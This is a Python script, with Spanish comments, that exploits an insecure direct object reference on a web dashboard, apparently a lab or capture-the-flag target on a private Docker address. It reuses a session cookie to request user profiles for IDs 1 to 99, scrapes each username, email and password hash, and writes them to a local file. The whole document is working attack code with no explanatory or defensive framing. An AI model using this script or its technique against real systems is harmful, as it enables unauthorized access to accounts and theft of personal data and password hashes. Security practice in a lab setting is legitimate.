import requests
from bs4 import BeautifulSoup
import time

# Configuración de la solicitud
url_base = "http://172.17.0.2:5000/dashboard"
output_file = "usuarios_extraidos.txt"

# Cabeceras extraídas de tu petición
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-MX,es;q=0.5",
    "Connection": "keep-alive",
    "Cookie": "session=eyJ1c2VyX2lkIjo5fQ.ah2Sfw.blClLFDRAxtkbNp4JSlKwK-_UTk",
    "Upgrade-Insecure-Requests": "1"
}

print(f"[*] Iniciando extracción de IDs (1 al 99)...")
print("-" * 60)

with open(output_file, "w", encoding="utf-8") as f:
    for i in range(1, 100):
        params = {'id': i}
        
        try:
            response = requests.get(url_base, headers=headers, params=params, timeout=5)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # CORRECCIÓN AQUÍ: Se usa class_ con guión bajo al final
                info_values = soup.find_all("span", class_="info-value")
                password_hash_div = soup.find("div", class_="password-hash")
                
                if len(info_values) >= 3 and password_hash_div:
                    username = info_values[0].text.strip()
                    email = info_values[1].text.strip()
                    user_id = info_values[2].text.strip()
                    pwd_hash = password_hash_div.text.strip()
                    
                    resultado = (
                        f"ID Solicitado: {i}\n"
                        f"Usuario:       {username}\n"
                        f"Email:         {email}\n"
                        f"ID Interno:    {user_id}\n"
                        f"Hash:          {pwd_hash}\n"
                        f"{'-'* 40}\n"
                    )
                    
                    print(f"[+] ID {i} encontrado:")
                    print(f"    Usuario: {username} | Email: {email} | Hash: {pwd_hash[:10]}...")
                    
                    f.write(resultado)
                    f.flush()
                else:
                    print(f"[-] ID {i}: Estructura de perfil no encontrada o ID vacío.")
            else:
                print(f"[-] ID {i}: Código de estado HTTP {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error de conexión en ID {i}: {e}")
            
        time.sleep(0.1)

print("-" * 60)
print(f"[+] Proceso finalizado. Resultados guardados en: {output_file}")
